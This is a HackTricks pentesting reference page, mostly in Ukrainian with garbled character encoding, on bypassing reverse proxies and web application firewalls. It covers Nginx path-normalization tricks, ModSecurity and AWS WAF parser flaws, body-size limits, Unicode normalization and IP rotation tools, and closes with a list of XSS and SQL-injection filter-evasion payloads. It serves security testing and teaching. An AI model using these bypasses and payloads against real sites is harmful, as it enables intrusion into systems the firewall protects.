# Proxy / WAF Protections Bypass

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

–¢–µ—Ö–Ω—ñ–∫–∏ [–∑ —Ü—å–æ–≥–æ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

–ü—Ä–∏–∫–ª–∞–¥ –ø—Ä–∞–≤–∏–ª–∞ Nginx:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
–©–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –æ–±—Ö–æ–¥–∞–º, Nginx –≤–∏–∫–æ–Ω—É—î –Ω–æ—Ä–º–∞–ª—ñ–∑–∞—Ü—ñ—é —à–ª—è—Ö—É –ø–µ—Ä–µ–¥ –π–æ–≥–æ –ø–µ—Ä–µ–≤—ñ—Ä–∫–æ—é. –û–¥–Ω–∞–∫, —è–∫—â–æ —Å–µ—Ä–≤–µ—Ä –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ –±–µ–∫–µ–Ω–¥–∞ –≤–∏–∫–æ–Ω—É—î —ñ–Ω—à—É –Ω–æ—Ä–º–∞–ª—ñ–∑–∞—Ü—ñ—é (–≤–∏–¥–∞–ª—è—é—á–∏ —Å–∏–º–≤–æ–ª–∏, —è–∫—ñ Nginx –Ω–µ –≤–∏–¥–∞–ª—è—î), –º–æ–∂–µ –±—É—Ç–∏ –º–æ–∂–ª–∏–≤–∏–º –æ–±—ñ–π—Ç–∏ —Ü—é –∑–∞—Ö–∏—Å—Ç.

### **NodeJS - Express**

| Nginx Version | **Node.js Bypass Characters** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx Version | **Flask Bypass Characters**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Version | **Spring Boot Bypass Characters** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

–ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è Nginx FPM:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –Ω–∞ –±–ª–æ–∫—É–≤–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –¥–æ `/admin.php`, –∞–ª–µ —Ü–µ –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏, –∑–≤–µ—Ä–Ω—É–≤—à–∏—Å—å –¥–æ `/admin.php/index.php`.

### –Ø–∫ –∑–∞–ø–æ–±—ñ–≥—Ç–∏
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Path Confusion

[**–£ —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) –ø–æ—è—Å–Ω—é—î—Ç—å—Å—è, —â–æ ModSecurity v3 (–¥–æ 3.0.12) **–Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ —Ä–µ–∞–ª—ñ–∑—É–≤–∞–≤ –∑–º—ñ–Ω–Ω—É `REQUEST_FILENAME`**, —è–∫–∞ –ø–æ–≤–∏–Ω–Ω–∞ –±—É–ª–∞ –º—ñ—Å—Ç–∏—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω–∏–π —à–ª—è—Ö (–¥–æ –ø–æ—á–∞—Ç–∫—É –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤). –¶–µ —Å—Ç–∞–ª–æ—Å—è —á–µ—Ä–µ–∑ —Ç–µ, —â–æ –≤—ñ–Ω –≤–∏–∫–æ–Ω—É–≤–∞–≤ –¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è URL, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —à–ª—è—Ö.\
–û—Ç–∂–µ, –∑–∞–ø–∏—Ç –Ω–∞ –∫—à—Ç–∞–ª—Ç `http://example.com/foo%3f';alert(1);foo=` –≤ mod security –±—É–¥–µ –≤–≤–∞–∂–∞—Ç–∏, —â–æ —à–ª—è—Ö - —Ü–µ –ø—Ä–æ—Å—Ç–æ `/foo`, –æ—Å–∫—ñ–ª—å–∫–∏ `%3f` –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –Ω–∞ `?`, –∑–∞–∫—ñ–Ω—á—É—é—á–∏ URL —à–ª—è—Ö, –∞–ª–µ –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ —à–ª—è—Ö, —è–∫–∏–π –æ—Ç—Ä–∏–º–∞—î —Å–µ—Ä–≤–µ—Ä, –±—É–¥–µ `/foo%3f';alert(1);foo=`.

–ó–º—ñ–Ω–Ω—ñ `REQUEST_BASENAME` —Ç–∞ `PATH_INFO` —Ç–∞–∫–æ–∂ –±—É–ª–∏ –ø—ñ–¥ –≤–ø–ª–∏–≤–æ–º —Ü—å–æ–≥–æ –±–∞–≥—É.

–©–æ—Å—å –ø–æ–¥—ñ–±–Ω–µ —Å—Ç–∞–ª–æ—Å—è –≤ –≤–µ—Ä—Å—ñ—ó 2 Mod Security, —â–æ –¥–æ–∑–≤–æ–ª–∏–ª–æ –æ–±—ñ–π—Ç–∏ –∑–∞—Ö–∏—Å—Ç, —è–∫–∏–π –∑–∞–≤–∞–∂–∞–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ñ–∞–π–ª—ñ–≤ –∑ –ø–µ–≤–Ω–∏–º–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º–∏, –ø–æ–≤'—è–∑–∞–Ω–∏–º–∏ –∑ —Ä–µ–∑–µ—Ä–≤–Ω–∏–º–∏ —Ñ–∞–π–ª–∞–º–∏ (—Ç–∞–∫–∏–º–∏ —è–∫ `.bak`), –ø—Ä–æ—Å—Ç–æ –Ω–∞–¥—ñ—Å–ª–∞–≤—à–∏ –∫—Ä–∞–ø–∫—É, –∑–∞–∫–æ–¥–æ–≤–∞–Ω—É –≤ `%2e`, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Malformed Header

[–¶–µ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) –∑–≥–∞–¥—É—î, —â–æ –±—É–ª–æ –º–æ–∂–ª–∏–≤–∏–º –æ–±—ñ–π—Ç–∏ –ø—Ä–∞–≤–∏–ª–∞ AWS WAF, –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ –¥–æ HTTP –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤, –Ω–∞–¥—ñ—Å–ª–∞–≤—à–∏ "–Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∏–π" –∑–∞–≥–æ–ª–æ–≤–æ–∫, —è–∫–∏–π –Ω–µ –±—É–≤ –ø—Ä–∞–≤–∏–ª—å–Ω–æ —Ä–æ–∑—ñ–±—Ä–∞–Ω–∏–π AWS, –∞–ª–µ –±—É–≤ —Ä–æ–∑—ñ–±—Ä–∞–Ω–∏–π —Å–µ—Ä–≤–µ—Ä–æ–º –Ω–∞ –∑–∞–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –Ω–∞–¥—ñ—Å–ª–∞–≤—à–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç –∑ SQL-—ñ–Ω'—î–∫—Ü—ñ—î—é –≤ –∑–∞–≥–æ–ª–æ–≤–∫—É X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
–ë—É–ª–æ –º–æ–∂–ª–∏–≤–∏–º –æ–±—ñ–π—Ç–∏ AWS WAF, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –Ω–µ —Ä–æ–∑—É–º—ñ–≤, —â–æ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ä—è–¥–æ–∫ —î —á–∞—Å—Ç–∏–Ω–æ—é –∑–Ω–∞—á–µ–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫–∞, —Ç–æ–¥—ñ —è–∫ —Å–µ—Ä–≤–µ—Ä NODEJS —Ü–µ —Ä–æ–∑—É–º—ñ–≤ (—Ü–µ –±—É–ª–æ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–æ).

## –ó–∞–≥–∞–ª—å–Ω—ñ –æ–±—Ö–æ–¥–∏ WAF

### –û–±–º–µ–∂–µ–Ω–Ω—è —Ä–æ–∑–º—ñ—Ä—É –∑–∞–ø–∏—Ç—É

–ó–∞–∑–≤–∏—á–∞–π WAF –º–∞—é—Ç—å –ø–µ–≤–Ω–∏–π –æ–±–º–µ–∂–µ–Ω–Ω—è –¥–æ–≤–∂–∏–Ω–∏ –∑–∞–ø–∏—Ç—ñ–≤ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏, —ñ —è–∫—â–æ –∑–∞–ø–∏—Ç POST/PUT/PATCH –ø–µ—Ä–µ–≤–∏—â—É—î –π–æ–≥–æ, WAF –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏–º–µ –∑–∞–ø–∏—Ç.

* –î–ª—è AWS WAF –≤–∏ –º–æ–∂–µ—Ç–µ [**–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—é**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∏–π —Ä–æ–∑–º—ñ—Ä —Ç—ñ–ª–∞ –≤–µ–±-–∑–∞–ø–∏—Ç—É, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–∏–π –¥–ª—è –∑–∞—Ö–∏—Å—Ç—É Application Load Balancer —Ç–∞ AWS AppSync</td><td>8 KB</td></tr><tr><td>–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∏–π —Ä–æ–∑–º—ñ—Ä —Ç—ñ–ª–∞ –≤–µ–±-–∑–∞–ø–∏—Ç—É, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–∏–π –¥–ª—è –∑–∞—Ö–∏—Å—Ç—É CloudFront, API Gateway, Amazon Cognito, App Runner —Ç–∞ Verified Access**</td><td>64 KB</td></tr></tbody></table>

* –ó [**–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó Azure**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

–°—Ç–∞—Ä—ñ –≤–µ–±-–¥–æ–¥–∞—Ç–∫–∏ –∑ –Ω–∞–±–æ—Ä–æ–º –æ—Å–Ω–æ–≤–Ω–∏—Ö –ø—Ä–∞–≤–∏–ª 3.1 (–∞–±–æ –Ω–∏–∂—á–µ) –¥–æ–∑–≤–æ–ª—è—é—Ç—å –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, —â–æ –ø–µ—Ä–µ–≤–∏—â—É—é—Ç—å **128 KB**, –≤–∏–º–∫–Ω—É–≤—à–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∫—É —Ç—ñ–ª–∞ –∑–∞–ø–∏—Ç—É, –∞–ª–µ —Ü—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –Ω–µ –±—É–¥—É—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω—ñ –Ω–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ. –î–ª—è –Ω–æ–≤—ñ—à–∏—Ö –≤–µ—Ä—Å—ñ–π (–Ω–∞–±—ñ—Ä –æ—Å–Ω–æ–≤–Ω–∏—Ö –ø—Ä–∞–≤–∏–ª 3.2 –∞–±–æ –Ω–æ–≤—ñ—à–∏–π) —Ç–µ –∂ —Å–∞–º–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏, –≤–∏–º–∫–Ω—É–≤—à–∏ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–µ –æ–±–º–µ–∂–µ–Ω–Ω—è —Ç—ñ–ª–∞ –∑–∞–ø–∏—Ç—É. –ö–æ–ª–∏ –∑–∞–ø–∏—Ç –ø–µ—Ä–µ–≤–∏—â—É—î –æ–±–º–µ–∂–µ–Ω–Ω—è —Ä–æ–∑–º—ñ—Ä—É:

–Ø–∫—â–æ **—Ä–µ–∂–∏–º –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è**: –õ–æ–≥—É–≤–∞–Ω–Ω—è —Ç–∞ –±–ª–æ–∫—É–≤–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—É.\
–Ø–∫—â–æ **—Ä–µ–∂–∏–º –≤–∏—è–≤–ª–µ–Ω–Ω—è**: –ü–µ—Ä–µ–≤—ñ—Ä—è—î –¥–æ –º–µ–∂—ñ, —ñ–≥–Ω–æ—Ä—É—î —Ä–µ—à—Ç—É —Ç–∞ –≤–µ–¥–µ –∂—É—Ä–Ω–∞–ª, —è–∫—â–æ `Content-Length` –ø–µ—Ä–µ–≤–∏—â—É—î –º–µ–∂—É.

* –ó [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º WAF –ø–µ—Ä–µ–≤—ñ—Ä—è—î –ª–∏—à–µ –ø–µ—Ä—à—ñ 8KB –∑–∞–ø–∏—Ç—É. –í—ñ–Ω –º–æ–∂–µ –∑–±—ñ–ª—å—à–∏—Ç–∏ –º–µ–∂—É –¥–æ 128KB, –¥–æ–¥–∞–≤—à–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω—É –º–µ—Ç–∞–¥–∞–Ω—ñ.

* –ó [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

–î–æ 128KB.

### –û–±—Ñ—É—Å–∫–∞—Ü—ñ—è <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode –°–æ–≤–º–µ—Å—Ç–∏–º—ñ—Å—Ç—å <a href="#unicode-compatability" id="unicode-compatability"></a>

–í –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó –Ω–æ—Ä–º–∞–ª—ñ–∑–∞—Ü—ñ—ó Unicode (–±—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó [—Ç—É—Ç](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)), —Å–∏–º–≤–æ–ª–∏, —è–∫—ñ –º–∞—é—Ç—å —Å—É–º—ñ—Å–Ω—ñ—Å—Ç—å Unicode, –º–æ–∂—É—Ç—å –æ–±—ñ–π—Ç–∏ WAF —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏—Å—è —è–∫ –∑–∞–ø–ª–∞–Ω–æ–≤–∞–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è. –°—É–º—ñ—Å–Ω—ñ —Å–∏–º–≤–æ–ª–∏ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://www.compart.com/en/unicode).

#### –ü—Ä–∏–∫–ª–∞–¥ <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
Ôºúimg src‚Åºp onerror‚ÅºÔºáprompt‚ÅΩ1‚ÅæÔºáÔπ•  --> Ôºúimg src=p onerror='prompt(1)'>
```
### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

* [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): –ì–µ–Ω–µ—Ä—É–π—Ç–µ URL-–∞–¥—Ä–µ—Å—É API —à–ª—é–∑—É –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∑ ffuf
* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): –°—Ö–æ–∂–µ –Ω–∞ fireprox
* [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): –ü–ª–∞–≥—ñ–Ω Burp Suite, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î IP-–∞–¥—Ä–µ—Å–∏ API —à–ª—é–∑—É
* [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): –î–∏–Ω–∞–º—ñ—á–Ω–æ –≤–∏–∑–Ω–∞—á–µ–Ω–∞ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤ –∞–∫—Ç–∏–≤—É—î—Ç—å—Å—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ä–æ–∑–º—ñ—Ä—É –≤—Ö—ñ–¥–Ω–æ–≥–æ —Ñ–∞–π–ª—É —Ç–∞ —Ñ–∞–∫—Ç–æ—Ä–∞ —Ä–æ–∑–ø–æ–¥—ñ–ª—É, –ø—Ä–∏ —Ü—å–æ–º—É –≤—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ —Ä–æ–∑–±–∏–≤–∞—é—Ç—å—Å—è –Ω–∞ —á–∞—Å—Ç–∏–Ω–∏ –¥–ª—è –ø–∞—Ä–∞–ª–µ–ª—å–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, 100 –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ –æ–±—Ä–æ–±–ª—è—é—Ç—å 100 —á–∞—Å—Ç–∏–Ω –∑ –≤—Ö—ñ–¥–Ω–æ–≥–æ —Ñ–∞–π–ª—É –Ω–∞ 10,000 —Ä—è–¥–∫—ñ–≤ –∑ —Ñ–∞–∫—Ç–æ—Ä–æ–º —Ä–æ–∑–ø–æ–¥—ñ–ª—É 100 —Ä—è–¥–∫—ñ–≤.

### Regex Bypasses

–†—ñ–∑–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –æ–±—Ö–æ–¥—É regex-—Ñ—ñ–ª—å—Ç—Ä—ñ–≤ –Ω–∞ –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä–∞—Ö. –ü—Ä–∏–∫–ª–∞–¥–∏ –≤–∫–ª—é—á–∞—é—Ç—å —á–µ—Ä–≥—É–≤–∞–Ω–Ω—è —Ä–µ–≥—ñ—Å—Ç—Ä—É, –¥–æ–¥–∞–≤–∞–Ω–Ω—è –ø–µ—Ä–µ–Ω–æ—Å—ñ–≤ —Ä—è–¥–∫—ñ–≤ —Ç–∞ –∫–æ–¥—É–≤–∞–Ω–Ω—è –∫–æ—Ä–∏—Å–Ω–∏—Ö –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—å. –†–µ—Å—É—Ä—Å–∏ –¥–ª—è —Ä—ñ–∑–Ω–∏—Ö –æ–±—Ö–æ–¥—ñ–≤ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –Ω–∞ [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) —Ç–∞ [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html). –ü—Ä–∏–∫–ª–∞–¥–∏ –Ω–∏–∂—á–µ –±—É–ª–∏ –≤–∑—è—Ç—ñ –∑ [—Ü—ñ—î—ó —Å—Ç–∞—Ç—Ç—ñ](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

* [**nowafpls**](https://github.com/assetnote/nowafpls): –ø–ª–∞–≥—ñ–Ω Burp –¥–ª—è –¥–æ–¥–∞–≤–∞–Ω–Ω—è —Å–º—ñ—Ç—Ç—î–≤–∏—Ö –¥–∞–Ω–∏—Ö –¥–æ –∑–∞–ø–∏—Ç—ñ–≤ –¥–ª—è –æ–±—Ö–æ–¥—É WAF –∑–∞ –¥–æ–≤–∂–∏–Ω–æ—é

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
* [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
* [https://www.youtube.com/watch?v=0OMmWtU2Y\_g](https://www.youtube.com/watch?v=0OMmWtU2Y\_g)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∫–∞ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
